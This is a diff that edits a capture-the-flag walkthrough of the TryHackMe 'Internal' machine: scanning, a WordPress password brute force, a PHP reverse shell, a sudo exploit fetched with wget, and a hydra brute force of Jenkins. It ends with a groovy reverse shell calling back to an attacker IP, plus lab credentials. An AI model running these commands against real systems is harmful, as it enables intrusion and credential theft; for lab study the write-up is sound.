@@ -13,6 +13,8 @@ Please note:
 
 ## First Checks
 
+Let's add internal.thm to the hosts file as requested and run nmap, niktio and gobuster to scan the target.
+
 ```sh
 sudo echo 10.10.156.30 internal.thm >> /etc/hosts
 
@@ -25,8 +27,7 @@ nikto -h $IP
 ### Namp
 
 ```sh
-fabian@kali:~$ nmap -sC -sV $IP
-Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-24 14:29 EDT
+nmap -sC -sV $IP
 Nmap scan report for 10.10.156.30
 Host is up (0.020s latency).
 Not shown: 998 closed ports
@@ -48,13 +49,12 @@ Nmap done: 1 IP address (1 host up) scanned in 8.50 seconds
 ### nikto
 
 ```sh
-fabian@kali:~$ nikto -h $IP
+nikto -h $IP
 - Nikto v2.1.6
 ---------------------------------------------------------------------------
 + Target IP:          10.10.156.30
 + Target Hostname:    10.10.156.30
 + Target Port:        80
-+ Start Time:         2021-06-24 14:29:56 (GMT-4)
 ---------------------------------------------------------------------------
 + Server: Apache/2.4.29 (Ubuntu)
 + The anti-clickjacking X-Frame-Options header is not present.
@@ -70,7 +70,6 @@ fabian@kali:~$ nikto -h $IP
 + Cookie wordpress_test_cookie created without the httponly flag
 + /blog/wp-login.php: Wordpress login found
 + 8042 requests: 0 error(s) and 11 item(s) reported on remote host
-+ End Time:           2021-06-24 14:33:40 (GMT-4) (224 seconds)
 ---------------------------------------------------------------------------
 + 1 host(s) tested
 ```
@@ -78,36 +77,19 @@ fabian@kali:~$ nikto -h $IP
 ### gobuster
 
 ```sh
-fabian@kali:~$ gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.156.30:80
-===============================================================
-Gobuster v3.1.0
-by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
-===============================================================
-[+] Url:                     http://10.10.156.30:80
-[+] Method:                  GET
-[+] Threads:                 10
-[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
-[+] Negative Status codes:   404
-[+] User Agent:              gobuster/3.1.0
-[+] Timeout:                 10s
-===============================================================
-2021/06/24 14:41:06 Starting gobuster in directory enumeration mode
+gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.156.30:80
 ===============================================================
 /blog                 (Status: 301) [Size: 311] [--> http://10.10.156.30/blog/]
 /wordpress            (Status: 301) [Size: 316] [--> http://10.10.156.30/wordpress/]
 /javascript           (Status: 301) [Size: 317] [--> http://10.10.156.30/javascript/]
 /phpmyadmin           (Status: 301) [Size: 317] [--> http://10.10.156.30/phpmyadmin/]
 /server-status        (Status: 403) [Size: 277]
-                                                                                     [[3~^[[3~
-===============================================================
-2021/06/24 14:49:03 Finished
-===============================================================
 ```
 
 ## Wordpress
 
 ```sh
-fabian@kali:~$ wpscan --url http://10.10.156.30/wordpress -P rockyou.txt -U admin
+wpscan --url http://10.10.156.30/wordpress -P rockyou.txt -U admin
 _______________________________________________________________
          __          _______   _____
          \ \        / /  __ \ / ____|
@@ -121,9 +103,6 @@ _______________________________________________________________
        Sponsored by Automattic - https://automattic.com/
        @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
 _______________________________________________________________
-
-[+] URL: http://10.10.156.30/wordpress/ [10.10.156.30]
-[+] Started: Thu Jun 24 14:51:10 2021
 
 Interesting Finding(s):
 
@@ -179,19 +158,13 @@ Trying admin / lizzy Time: 00:01:19 <                                           
 
 [!] No WPScan API Token given, as a result vulnerability data has not been output.
 [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
-
-[+] Finished: Thu Jun 24 14:52:44 2021
-[+] Requests Done: 4062
-[+] Cached Requests: 4
-[+] Data Sent: 1.902 MB
-[+] Data Received: 15.967 MB
-[+] Memory used: 210.898 MB
-[+] Elapsed time: 00:01:34
 ```
 
 So now we can login to wordpress as admin and look around.
 
 The wordpress page reveals a private note on credentals of william being william:arnold147 sofar this doesnt seem usable
+
+## Wordpress php reverse shell
 
 I used this [php reverse shell](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/php_reverse_shell.php), modified IP and port and uploaded it to the wordpress 404 page. Now time to start netcat on the chosen port e.g. ```nc -lvnp 6666``` and call a page that doesn't exist e.g. ```/blog/index.php/2020/08/03/50/``` with e.g. curl.
 
@@ -253,6 +226,8 @@ Aubreanna needed these credentials for something later.  Let her know you have t
 aubreanna:bubb13guM!@#123
 ```
 
+## Aubreanna
+
 So let's login via aubreanna: ```ssh aubreanna@10.10.156.30``` and we find the first flag (user.txt) in the home dir.
 
 Unfortunantly ```sudo -l``` is not allowed
@@ -299,7 +274,7 @@ We also see we have Sudo running in version ```1.8.21``` and a check with search
 ```sh
 wget -O exploit.c https://www.exploit-db.com/raw/42183
 gcc -o exploit exploit.c
-scp exploit aubreanna@10.10.45.40:~/exploit
+scp exploit aubreanna@10.10.156.30:~/exploit
 ```
 
 @aubreanna@internal
@@ -312,6 +287,8 @@ died in main: 57
 
 I tried changing the c code but felt like a script kiddy as errors just moved on... so I gave up on this.
 
+## Jenkins
+
 In the home folder of aubreanna there is txt mentioning a local jenkins server.
 
 From kali lets tunnel local port 31340 with ssh to "127.0.0.1:8080" on internal.thm (which we modified at the beginning).
@@ -320,9 +297,20 @@ From kali lets tunnel local port 31340 with ssh to "127.0.0.1:8080" on internal.
 ssh -g -L31340:127.0.0.1:8080 -l aubreanna internal.thm
 ```
 
-we can the open jenkins from your kali machine e.g. http://localhost:31340
+We can the open jenkins from your kali machine e.g. http://localhost:31340 and analyse the login prompt with burpsuite:
 
-Lets run [this groovy reverse shell](https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy) in the jenkins script conosole and just changed "cmd" to "/bin/bash" as well as IP and port and started a new netcat session on port 7777
+![_internal_burpsuite](_internal_burpsuite.jpg)
+
+Using the information from the intercepted post command of a failed login attempt we can build the hdyra bruteforce attack:
+
+```sh
+hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost -s 31340 http-post-form "/j_acegi_security_check:j_username=admin&j_password=^PASS^&from=&Submit=Sign+in:F=Invalid"
+```
+
+
+## Jenkins groovy reverse shell
+
+Luckily the password is simple and cracked rather fast using the rockyou.txt. Now that we are logged in as admin in the Jenkins portal let's run [this groovy reverse shell](https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy) in the jenkins script conosole and just changed "cmd" to "/bin/bash" as well as IP and port and started a new netcat session on port 7777
 
 ```groovy
 String host="10.9.193.173";
@@ -367,6 +355,6 @@ root:tr0ub13guM!@#123
 Let ssh as root and see if we find the flag :)
 
 ```sh
-ssh root@10.10.45.40
+ssh root@10.10.156.30
 root@internal:~# cat root.txt
 ```
